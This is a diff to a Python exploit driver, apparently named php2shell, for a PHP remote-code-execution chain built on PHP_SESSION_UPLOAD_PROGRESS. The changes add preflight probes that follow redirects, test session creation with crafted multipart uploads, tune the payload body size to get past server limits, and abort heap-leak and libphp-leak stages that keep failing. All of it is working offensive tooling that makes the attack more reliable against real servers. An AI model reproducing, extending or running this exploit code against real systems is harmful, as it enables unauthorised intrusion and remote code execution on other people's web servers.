@@ -36,6 +36,7 @@ from __future__ import annotations
 import base64
 import json
 import os
+import posixpath
 import re
 import socket
 import struct
@@ -43,6 +44,7 @@ import subprocess
 import sys
 import threading
 import time
+import urllib.parse
 from collections import Counter, deque
 
 _HERE = os.path.dirname(os.path.abspath(__file__))
@@ -245,9 +247,151 @@ class ShellAgent:
     PRIVATE_HOST_RE = re.compile(
         r"^(10\.|127\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|169\.254\.)")
 
+    def _raw_get(self, path: str) -> tuple[int, dict[str, list[str]], bytes]:
+        """GET that returns parsed status/headers/body (the exploit client's
+        Target.get only returns status+body; the headers carry the diagnosis)."""
+        hdr = (f"GET {path} HTTP/1.1\r\nHost: {self.t.host}:{self.t.port}\r\n"
+               "Connection: close\r\n\r\n").encode()
+        s = self.t._connect()
+        s.settimeout(self.t.timeout)
+        data = bytearray()
+        try:
+            s.sendall(hdr)
+            while len(data) < (1 << 20):
+                chunk = s.recv(65536)
+                if not chunk:
+                    break
+                data += chunk
+        except OSError:
+            pass
+        finally:
+            s.close()
+        head, _, body = bytes(data).partition(b"\r\n\r\n")
+        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
+        status = int(m.group(1)) if m else 0
+        if status == 0:
+            raise ValueError(
+                f"TCP open but no HTTP response from {self.t.host}:{self.t.port} "
+                "via the exploit client - check http:// vs https://, the port, and "
+                "that the URL path points at the PHP page")
+        headers: dict[str, list[str]] = {}
+        for line in head.split(b"\r\n")[1:]:
+            if b":" in line:
+                k, v = line.split(b":", 1)
+                headers.setdefault(k.strip().lower().decode("latin1"),
+                                   []).append(v.strip().decode("latin1"))
+        return status, headers, body
+
+    def _resolve_location(self, loc: str, cur: str, host: str,
+                          port: int) -> str | None:
+        """Resolve a Location header to a same-host path (None = cannot follow)."""
+        loc = loc.strip()
+        u = urllib.parse.urlsplit(loc)
+        if u.scheme in ("http", "https"):
+            hop_port = u.port or (443 if u.scheme == "https" else 80)
+            if u.hostname != host or hop_port != port:
+                self.log(f"[-] preflight: redirect leaves the target host ({loc}) "
+                         "- point the URL at that page directly instead", "warn")
+                return None
+            return u.path or "/"
+        if loc.startswith("/"):
+            return u.path or "/"
+        base = cur.rsplit("/", 1)[0]
+        return posixpath.normpath(f"{base}/{u.path}") or "/"
+
+    _PROBE_BOUNDARY = b"P2Sprobe00"
+
+    def _probe_post(self, progress: bool = True,
+                    huge_mb: int | None = None) -> tuple[int, bool]:
+        """Minimal multipart POST shaped like the exploit's requests; returns
+        (status, has Set-Cookie PHPSESSID). No session cookie is sent, so PHP
+        must create a fresh session - exactly when Set-Cookie appears."""
+        parts: list[dict] = []
+        if progress:
+            parts.append({"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"probe"})
+        parts.append({"name": "f", "filename": "p.txt", "data": b"A" * 64})
+        if huge_mb:
+            parts.append({"name": "big", "data": b"B" * (huge_mb * 1024 * 1024)})
+        resp = self.t.post(ex.build_multipart(parts, self._PROBE_BOUNDARY),
+                           self._PROBE_BOUNDARY, read_cap=1 << 16,
+                           timeout=max(90.0, self.t.timeout))
+        head_raw = resp.partition(b"\r\n\r\n")[0]
+        m = re.match(rb"HTTP/1\.[01] (\d{3})", head_raw)
+        status = int(m.group(1)) if m else 0
+        return status, b"set-cookie: phpsessid=" in head_raw.lower()
+
+    def _session_upload_probe(self) -> None:
+        """GO/NO-GO gate before any exploit attempt.
+
+        The whole php2shell chain (Wiz/Datadog writeups) rides on PHP's
+        rfc1867 upload-progress handler: the POST must reach PHP and make it
+        start a session (fresh Set-Cookie PHPSESSID). If that does not happen,
+        no amount of retries can help - fail the run right here with the
+        precise reason instead of burning attempts."""
+        try:
+            st, ok = self._probe_post(progress=True)
+        except OSError as e:
+            raise ValueError(f"upload probe request failed ({e})") from e
+        self.log(f"[*] preflight: upload probe (PHP_SESSION_UPLOAD_PROGRESS, "
+                 f"POST {self.t.path}) -> HTTP {st}"
+                 + (", Set-Cookie PHPSESSID ok" if ok else ", no Set-Cookie"))
+        if not ok:
+            try:
+                st0, ok0 = self._probe_post(progress=False)
+            except OSError:
+                st0, ok0 = 0, False
+            self.log(f"[*] preflight: control probe (plain POST, no upload "
+                     f"field) -> HTTP {st0}"
+                     + (", Set-Cookie ok" if ok0 else ", no Set-Cookie"))
+            if ok0:
+                raise ValueError(
+                    "a plain POST gets a session cookie but the "
+                    "PHP_SESSION_UPLOAD_PROGRESS one does not - "
+                    "session.upload_progress.enabled=0 on this target; the "
+                    "exploit needs it (default On). Cannot proceed.")
+            raise ValueError(
+                f"upload probe: no Set-Cookie PHPSESSID (with field: HTTP {st}, "
+                f"control: HTTP {st0}) - the exploit POST is not reaching PHP's "
+                "session handler. Usual causes: the URL is not a PHP page "
+                "(redirect/static/404 - check the retarget line above), "
+                "session.upload_progress.enabled=0, session.use_cookies=0, or a "
+                "custom session.name. Point the URL at the app's PHP entry page "
+                "(e.g. its login page).")
+        self.log("[+] preflight: session upload accepted - proceeding")
+        # Verify the multi-MB body the exploit needs is not swallowed by a
+        # body-size limit (nginx client_max_body_size defaults to 1M) or
+        # post_max_size. PHP silently drops oversized bodies without a 413,
+        # so calibrate huge_mb down until the session still starts.
+        base = int(self.cfg.get("huge_mb", 12) or 12)
+        for mb in dict.fromkeys([base, 8, 7, 2]):
+            try:
+                st, ok = self._probe_post(progress=True, huge_mb=mb)
+            except OSError as e:
+                raise ValueError(f"{mb}MB body probe request failed ({e})") from e
+            self.log(f"[*] preflight: body probe ({mb}MB) -> HTTP {st}"
+                     + (", Set-Cookie ok" if ok else ", no Set-Cookie"))
+            if st == 413:
+                raise ValueError(
+                    f"body probe: the server rejects {mb}MB POSTs (HTTP 413) - a "
+                    "body-size limit (nginx client_max_body_size defaults to 1M; "
+                    "PHP default post_max_size=8M) is below what this exploit "
+                    "needs (huge_mb must exceed the target memory_limit). Cannot "
+                    "exploit as configured.")
+            if ok:
+                if mb != self.x.huge_mb:
+                    self.x.huge_mb = mb
+                    self.log(f"[*] adaptive: huge_mb -> {mb}MB (largest body the "
+                             "target still turns into a session)", "warn")
+                return
+        raise ValueError(
+            "body probe: even a 2MB upload POST gets no Set-Cookie while the 1KB "
+            "one does - post_max_size is under 2MB (PHP default is 8M; check the "
+            "server config). This exploit needs a multi-MB POST; cannot proceed.")
+
     def preflight(self) -> None:
         """Fail fast with an actionable message if the target is unreachable,
-        and fingerprint the page (session cookie, PHP version, Apache build)."""
+        fingerprint the page, follow redirects to the real PHP entry point, and
+        prove the session-upload request works BEFORE spending attempts."""
         host, port = self.t.host, self.t.port
         try:
             s = socket.create_connection((host, port), timeout=8.0)
@@ -260,42 +404,28 @@ class ShellAgent:
                         "(locally: docker compose up --build) or use a publicly "
                         "reachable target URL")
             raise ValueError(f"cannot reach {host}:{port} ({e}){hint}") from e
-        # Raw GET so we see the response HEADERS (the exploit client's Target.get
-        # only returns status+body, but the headers carry the diagnosis).
-        try:
-            hdr = (f"GET {self.t.path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
-                   "Connection: close\r\n\r\n").encode()
-            s = self.t._connect()
-            s.settimeout(self.t.timeout)
-            data = bytearray()
-            try:
-                s.sendall(hdr)
-                while len(data) < (1 << 20):
-                    chunk = s.recv(65536)
-                    if not chunk:
-                        break
-                    data += chunk
-            except OSError:
-                pass
-            finally:
-                s.close()
-        except OSError as e:
-            raise ValueError(f"HTTP request to {host}:{port} failed ({e})") from e
-        head, _, body = bytes(data).partition(b"\r\n\r\n")
-        m = re.match(rb"HTTP/1\.[01] (\d{3})", head)
-        status = int(m.group(1)) if m else 0
-        if status == 0:
-            raise ValueError(
-                f"TCP open but no HTTP response from {host}:{port} via the exploit "
-                "client - check http:// vs https://, the port, and that the URL "
-                "path points at the PHP page")
-        self.log(f"[*] preflight: GET {self.t.path} -> HTTP {status} ({len(body)} bytes)")
-        headers: dict[str, list[str]] = {}
-        for line in head.split(b"\r\n")[1:]:
-            if b":" in line:
-                k, v = line.split(b":", 1)
-                headers.setdefault(k.strip().lower().decode("latin1"),
-                                   []).append(v.strip().decode("latin1"))
+        # Follow GET redirects (up to 4 hops). nginx commonly 301s /index.php to
+        # /index.php/; a POST to the original path would bounce off the redirect
+        # and never reach PHP (=> "no Set-Cookie at all" on every attempt).
+        path = self.t.path
+        status, headers, body = 0, {}, b""
+        hops = 0
+        while True:
+            status, headers, body = self._raw_get(path)
+            self.log(f"[*] preflight: GET {path} -> HTTP {status} ({len(body)} bytes)"
+                     + (f" [redirect hop {hops}]" if hops else ""))
+            if (status in (301, 302, 303, 307, 308) and "location" in headers
+                    and hops < 4):
+                nxt = self._resolve_location(headers["location"][0], path, host, port)
+                if nxt is None:
+                    break
+                path = nxt
+                hops += 1
+                continue
+            break
+        if hops and path != self.t.path:
+            self.t.path = path
+            self.log(f"[*] preflight: exploit POST path retargeted to {path}", "warn")
         server = "; ".join(headers.get("server", []))
         powered = "; ".join(headers.get("x-powered-by", []))
         setcookies = headers.get("set-cookie", [])
@@ -316,22 +446,17 @@ class ShellAgent:
         elif "Apache/2.4.69" in server and self.x.profile == "lab":
             self.log("[!] preflight: Apache/2.4.69 looks like the 'bookworm' "
                      "build - select profile=bookworm", "warn")
-        if "location" in headers:
-            self.log(f"[*] preflight: redirect -> {headers['location'][0]} "
-                     "(the page that starts the session may be that one)", "warn")
         if setcookies:
             names = [c.split("=", 1)[0] for c in setcookies]
-            self.log(f"[*] preflight: session cookie(s): {', '.join(names)}")
+            self.log(f"[*] preflight: session cookie(s) on GET: {', '.join(names)}")
             if not any(n == "PHPSESSID" for n in names):
                 self.log(f"[-] preflight: session cookie name is {names[0]!r}, "
                          "not PHPSESSID - the exploit expects the default "
                          "session.name", "warn")
-        else:
-            self.log("[-] preflight: no Set-Cookie on plain GET - this page never "
-                     "starts a PHP session. PHP_SESSION_UPLOAD_PROGRESS needs a "
-                     "page that calls session_start(): point the URL at the app "
-                     "page (e.g. its login page), or set session.auto_start=1",
-                     "warn")
+        # Plain GET without a cookie is only a HINT (many apps start sessions
+        # on other pages; upload progress starts one by itself). The upload
+        # probe above is the authoritative go/no-go test.
+        self._session_upload_probe()
 
     def _leak_diag(self, stage: str) -> None:
         """Explain the most common reasons a leak stage keeps failing."""
@@ -368,9 +493,9 @@ class ShellAgent:
             self.log(f"[-] {stage}: leak cookie only {n}B (<1000) - grooming "
                      "missed the leak window this attempt", "warn")
             return "short"
-        self.log(f"[-] {stage}: no Set-Cookie leak at all - the target ignored "
-                 "the session upload (wrong page? upload_progress disabled? "
-                 "post_max_size smaller than huge_mb?)", "warn")
+        self.log(f"[-] {stage}: no Set-Cookie leak at all on this attempt - the "
+                 "upload POST got no session (body-size limit? different backend "
+                 "worker serving this request?)", "warn")
         return "none"
 
     def _apply_profile(self, name: str) -> bool:
@@ -402,8 +527,8 @@ class ShellAgent:
     def _adapt_huge_mb(self, category: str, misses: int) -> None:
         """Cycle the OOM field size when the diagnostics point at it."""
         base = int(self.cfg.get("huge_mb", 12) or 12)
-        cycle = [base] if category == "none" else (
-            [base, 7, 24] if category == "short" else [base, 24])
+        cycle = ([base, 8, 7, 2] if category == "none" else
+                 [base, 7, 24] if category == "short" else [base, 24])
         new = cycle[misses % len(cycle)]
         if new != self.x.huge_mb:
             self.x.huge_mb = new
@@ -543,6 +668,7 @@ class ShellAgent:
 
         self.stage("stage1", "running")
         misses = 0
+        none_streak = 0
         for attempt in range(1, retries + 1):
             self.log(f"[*] stage 1: heap leak (attempt {attempt}/{retries})")
             try:
@@ -556,11 +682,26 @@ class ShellAgent:
             misses += 1
             self.log("[-] heap leak missed", "warn")
             category = self._attempt_diag("stage 1")
+            # "no Set-Cookie at all" is deterministic (routing/config), not
+            # grooming luck - a few in a row means stop instead of burning the
+            # whole retry budget on something retries cannot fix.
+            none_streak = none_streak + 1 if category == "none" else 0
+            if none_streak >= 4:
+                self.stage("stage1", "failed",
+                           "target never returns Set-Cookie on the upload requests")
+                msg = (f"ABORTED: {none_streak} attempts in a row got no Set-Cookie "
+                       "at all - retrying cannot fix this (request routing/config, "
+                       "not grooming luck). Re-read the preflight probe lines above: "
+                       "the exploit POST is not reaching PHP's session handler.")
+                self.log(f"[!] {msg}", "warn")
+                self.state_event()
+                return {"ok": False, "error": msg}
             if attempt < retries:
                 self.fresh_worker()
                 # The two calibrated builds use different field counts; if the
-                # chosen profile keeps missing, try the other one.
-                if misses == 3:
+                # chosen profile keeps missing, try the other one. Pointless
+                # when there is no cookie at all - keep the profile then.
+                if misses == 3 and category != "none":
                     other = "lab" if self.x.profile == "bookworm" else "bookworm"
                     self._apply_profile(other)
                 self._adapt_huge_mb(category, misses)
@@ -574,6 +715,7 @@ class ShellAgent:
                               f"(last leak cookie: {n} bytes)")}
 
         self.stage("stage2", "running")
+        none_streak = 0
         for attempt in range(1, retries + 1):
             self.log(f"[*] stage 2: libphp leak (attempt {attempt}/{retries})")
             try:
@@ -585,7 +727,18 @@ class ShellAgent:
                 self.stage("stage2", "done", f"libphp base = 0x{self.libphp:x}")
                 break
             self.log("[-] libphp leak missed", "warn")
-            self._attempt_diag("stage 2")
+            category = self._attempt_diag("stage 2")
+            none_streak = none_streak + 1 if category == "none" else 0
+            if none_streak >= 3:
+                self.stage("stage2", "failed", "target stopped returning Set-Cookie")
+                msg = ("ABORTED: stage 2 got no Set-Cookie at all on 3 consecutive "
+                       "attempts - the target stopped behaving like it did during "
+                       "stage 1 (worker pool exhausted? target crashed or reloaded? "
+                       "requests landing on different backends?). Not retrying "
+                       "further.")
+                self.log(f"[!] {msg}", "warn")
+                self.state_event()
+                return {"ok": False, "error": msg}
             if attempt < retries:
                 self.fresh_worker()
         if not self.libphp:
